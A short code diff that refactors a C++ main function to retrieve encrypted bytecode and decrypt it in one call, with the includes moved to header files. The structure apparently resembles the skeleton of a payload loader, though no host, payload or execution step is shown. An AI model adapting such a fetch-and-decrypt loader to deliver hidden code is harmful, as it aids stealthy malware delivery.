@@ -1,14 +1,13 @@
-#include "decrypt.cpp"
-#include "fetch.cpp"
-#include "vars.cpp"
+#include "decrypt.hpp"
+#include "retrieve/fetch.hpp"
+#include "static/vars.hpp"
 
 #include <iostream>
 #include <vector>
 
 int main() {
   try {
-    std::vector<unsigned char> eBytecode = fetch_instructions();
-    std::vector<unsigned char> decrypted = decrypt_instructions(eBytecode);
+    std::vector<unsigned char> bytecode = decrypt_bytecode(retrieve_bytecode());
   } catch (const std::exception &e) {
     std::cerr << "[!] Exception: " << e.what() << "\n";
   }
